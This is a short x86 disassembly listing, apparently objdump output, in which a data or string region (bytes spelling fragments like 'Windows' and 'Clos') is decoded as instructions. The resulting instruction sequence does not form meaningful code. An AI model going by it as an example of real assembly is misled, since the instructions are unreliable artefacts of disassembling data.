  42003d:	add    BYTE PTR [edx],al
  42003f:	add    BYTE PTR [eax+eax*1+0x2],cl
  420043:	add    BYTE PTR [eax+0x0],dl
  420046:	add    al,BYTE PTR [eax]
  420048:	fdivr  QWORD PTR [eax+eax*1]
  42004b:	add    BYTE PTR [esi+0x0],bl
  42004e:	add    al,BYTE PTR [eax]
  420050:	add    BYTE PTR [eax],al
  420052:	push   edi
  420053:	outs   dx,DWORD PTR ds:[esi]
  420054:	jb     0x4200ba
  420056:	push   edi
  420057:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  42005e:	aas    
  42005f:	inc    ebx
  420060:	ins    BYTE PTR es:[edi],dx
  420061:	outs   dx,DWORD PTR ds:[esi]
  420062:	jae    0x4200c9
  420064:	push   edi
  420065:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  42006c:	popa   
  42006d:	je     0x4200d8
  42006f:	outs   dx,DWORD PTR ds:[esi]
  420070:	outs   dx,BYTE PTR ds:[esi]
  420071:	inc    ebx
  420072:	ins    BYTE PTR es:[edi],dx
  420073:	outs   dx,DWORD PTR ds:[esi]
  420074:	jae    0x4200db
  420076:	push   edi
  420077:	imul   eax,DWORD PTR [eax],0x0
	...
